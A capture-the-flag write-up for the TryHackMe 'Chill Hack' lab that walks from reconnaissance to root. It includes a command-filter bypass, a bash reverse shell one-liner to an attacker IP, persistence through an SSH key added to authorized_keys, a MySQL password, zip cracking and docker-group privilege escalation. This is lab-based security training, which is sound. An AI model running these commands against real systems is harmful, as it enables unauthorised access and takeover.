# TryHackMe - Chill Hack Room
<img width="551" alt="image" src="https://user-images.githubusercontent.com/114961392/210290991-812658d1-ebe3-4732-8137-bb465e0eab7c.png">

## Reconnaissance
Let's start by scanning all ports with nmap then run a version and script scan for all open ports.  

<img width="494" alt="image" src="https://user-images.githubusercontent.com/114961392/210291196-1070d4d7-0ddd-4b33-995e-20519771c1f9.png">

Ports 21 (FTP), 22 (SSH), and 80 (HTTP) are open. Port 21 (FTP) allows anonymous login which I will check out.  
The webpage is a gaming information site which looks pretty good however there is nothing too interesting to play with.  

<img width="740" alt="image" src="https://user-images.githubusercontent.com/114961392/210291496-46597055-060f-45f3-9321-fde604000749.png">

Let's check out FTP by logging in anonymously.  
There is only 1 file in there called note.txt which I will grab. This just says that there is filtering on strings being put in the command. I am assuming this will be a clue once I have done all recon.  
There are also 2 names (Anurodh and Apaar) which I will note down for later.  

<img width="830" alt="image" src="https://user-images.githubusercontent.com/114961392/210292050-b6978420-db7d-4ecb-8663-060b935ae6d0.png">

Now let's brute force for any hidden directories.  

<img width="484" alt="image" src="https://user-images.githubusercontent.com/114961392/210292520-d3abaaef-62d7-4bde-90de-9c2675fd04df.png">

This reveals that there is a hidden directory called **/secret**. When I navigate to the directory, I am presented with a basic page which let's you execute commands. Looking back on the note I discovered in FTP, I am assuming that they were referencing this page and there will be a filter on these commands. Let's have a look.  

<img width="170" alt="image" src="https://user-images.githubusercontent.com/114961392/210293055-4ad2dfba-00f9-4474-bc61-2bc460110333.png">

When I try to enter the simple command **ls**, it fails and text comes up asking if I am a hacker. Looks like there is definitely some filtering going on here.  

<img width="978" alt="image" src="https://user-images.githubusercontent.com/114961392/210293680-0e35a016-703b-461e-bc7e-a4fbd3b5d3ad.png">

However the **id** command works.  

<img width="422" alt="image" src="https://user-images.githubusercontent.com/114961392/210293893-0d129b6e-a29c-44ce-83ee-d5570636a811.png">

After doing some research on google for bypassing filters, there is some useful information on [hacktricks](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions) which I will use.  
I found that the best technique to bypass is to enter a backslash after the first letter in the command followed by the rest of the command. Such as **l\s -la**.  

<img width="1263" alt="image" src="https://user-images.githubusercontent.com/114961392/210294407-4d20ee4a-ad7c-4344-b956-66ae26deebb0.png">

## Exploitation
Now that I can bypass the filter, let's try executing a reverse shell. I will use command **b\ash -c "bash -i >& /dev/tcp/10.4.2.215/4444 0>&1"**. Remember that I need to enter a backslash after the first letter of the command.  

<img width="401" alt="image" src="https://user-images.githubusercontent.com/114961392/210294685-27989c0f-6e6d-454f-b959-26a18314fc86.png">

This works and now we have a reverse shell! Before continuing, I will upgrade the shell using the stty technique **script /dev/null -c bash** followed by **stty raw -echo; fg**.  
Now that I am in, let's do some manual enumeration. First of all, I checked the usual /var/www directory and there was an interesting folder called **files**. It looks like another directory for a web server. However there is nothing interesting in there yet. I will come back to this.  

<img width="585" alt="image" src="https://user-images.githubusercontent.com/114961392/210299126-4cda054e-06d3-4cad-96ad-97c7144c355f.png">

In the /home directory, the only user I can access is **Apaar**. In their directory, there are 2 interesting files (local.txt and .helpline.sh).  

<img width="353" alt="image" src="https://user-images.githubusercontent.com/114961392/210296092-4305a4a3-5993-4236-945d-4eba59b94441.png">

I do not have permission to access the local.txt file however we can run the .helpline.sh file. I can create another shell with the helpline.sh file by entering **bash** in the 2 input fields however this just gives me the same permissions. We need to run this file with another user.  
Let's see what user www-data has permissions to by entering **sudo -l**.  

<img width="470" alt="image" src="https://user-images.githubusercontent.com/114961392/210296401-646eaef2-9ac5-4a9b-966c-018a9e0435fc.png">

Perfect, we can run the helpline.sh file as user Apaar. I can do this by using command **sudo -u apaar /home/apaar/.helpline.sh**.  
Then I will enter bash in the input field and wooshkah, we now have access to user apaar. From here we can look at the local.txt file which has the user flag.  

<img width="345" alt="image" src="https://user-images.githubusercontent.com/114961392/210296781-ee15f6f6-a758-462b-ad8b-6edaef2e132d.png">

Now let's create a SSH key so we have a more secure connection. I will use ssh-keygen on my attack machine for this with command **ssh-keygen -f apaar**.  

<img width="314" alt="image" src="https://user-images.githubusercontent.com/114961392/210297282-8b39996a-85f5-41b5-90f0-bac0fa863fe8.png">

Then I will copy the contents of the apaar.pub file (public key) to the **authorized_keys** file in the victim machine using **echo**. Once the public key is in the **authorized_keys** file, I can SSH in using the private key I created.  

<img width="398" alt="image" src="https://user-images.githubusercontent.com/114961392/210297870-8d90107a-c0fb-47e8-8741-11245ec305f6.png">

Now we have a much more stable connection.  
Let's upload **linpeas** to see where we can go from here.  

<img width="430" alt="image" src="https://user-images.githubusercontent.com/114961392/210298613-646e3dc7-c73d-40a8-bec6-005c38f503f0.png">

Linpeas shows 2 interesting ports which are active (9001 and 3306). 3306 is MySQL however I am not sure what port 9001 is. Let's find out!  
If I do a curl request to port 9001, we get a response back. It looks similar to the pages in the other web server directory that I found in **/var/www**.  

<img width="737" alt="image" src="https://user-images.githubusercontent.com/114961392/210299295-5520f733-8ad0-4310-9c4c-30b8611d1144.png">

Let's go back to that directory and have a look. The **index.html** file reveals a password for MySQL!  

<img width="599" alt="image" src="https://user-images.githubusercontent.com/114961392/210299727-ac5f7a81-ecba-4962-9d4d-0b30e0a7a991.png">

Now let's try logging into MySQL with these credentials.  
**mysql -h localhost -u root -p'!@m+her00+@db'**
This connects and now we can enumerate databases. The webportal database looks interesting so let's use that and take a look.  

<img width="415" alt="image" src="https://user-images.githubusercontent.com/114961392/210300215-4c177905-b640-4076-bb20-07b4c8bd7f86.png">

2 passwords are revealed which can be cracked using [crackstation](https://crackstation.net/). I will use this to try to connect to user Aurick however the password did not work.  
There is nothing else interesting in MySQL so let's move on. Let's look back at the **/var/www/files** directory as the **account.php** and **hacker.php** files looked interesting. The **hacker.php** file has a clue "Look in the dark! You will find your answer". Looks like there is something interesting going on in the hacker-with-laptop_23-2147985341.jpg file.

<img width="473" alt="image" src="https://user-images.githubusercontent.com/114961392/210301091-63e379f0-4361-4b38-87bb-1ebd7ca0cbbd.png">

I will set up a python server so I can transfer the image back to my attack machine.   

<img width="275" alt="image" src="https://user-images.githubusercontent.com/114961392/210301221-c946f6a5-cf8f-4b85-90a1-3259243067a2.png">

Since it is an image file, I am assuming that there is some steganography going on here. Let's try extract with **steghide** using command **steghide extract -sf hacker-with-laptop_23-2147985341.jpg**.  

<img width="317" alt="image" src="https://user-images.githubusercontent.com/114961392/210301519-c3c02531-c248-4309-8a73-d11f91f0100e.png">

I just pressed enter for password and it worked. Now we have a zip file which requires a password. Let's fire up old John The Ripper.  
First I will use the **zip2john** module to create a hash of the zip file. Then I will use john to crack the hash with the rockyou password list.  

<img width="703" alt="image" src="https://user-images.githubusercontent.com/114961392/210301804-9ee3fc1f-1bc0-48d2-a2f4-103201c9a9a4.png">

<img width="472" alt="image" src="https://user-images.githubusercontent.com/114961392/210301811-fb9315b7-1733-4a4e-bece-55e5fd6e08a4.png">

This reveals the password for the zip file and now we can extract the source_code.php file.  

<img width="502" alt="image" src="https://user-images.githubusercontent.com/114961392/210301973-e1fc6533-53ac-4545-9c53-59dadcd78709.png">

This has a password which looks like its encoded in base64. Let's try to decode.  

<img width="287" alt="image" src="https://user-images.githubusercontent.com/114961392/210302006-8121a5b1-c1e2-43bd-ace4-0936a8ae467a.png">

Now we have a password for Anurodh which we can use to switch to user anurodh.  

<img width="156" alt="image" src="https://user-images.githubusercontent.com/114961392/210305663-eb71deb6-5b71-4a37-87f2-cabf36633109.png">

By using the **id** command, we can check what groups user anurodh is in. Looks like they are in the **docker** group which we should be able to exploit.  
Let's have a look at [GTFOBins](https://gtfobins.github.io/gtfobins/docker/) for docker.  

<img width="620" alt="image" src="https://user-images.githubusercontent.com/114961392/210305921-29b4870e-4512-4165-8b13-d585eb8f57f2.png">

This shows that I can exploit docker to get to root.  

<img width="608" alt="image" src="https://user-images.githubusercontent.com/114961392/210306041-800409d3-473d-4a76-b986-1e46d07a25d1.png">

Now that we have root, we can go ahead and access proof.txt in the root directory and capture flag.  

<img width="569" alt="image" src="https://user-images.githubusercontent.com/114961392/210306192-d84900fd-7ece-4473-93f8-7f28cfc0a6f1.png">
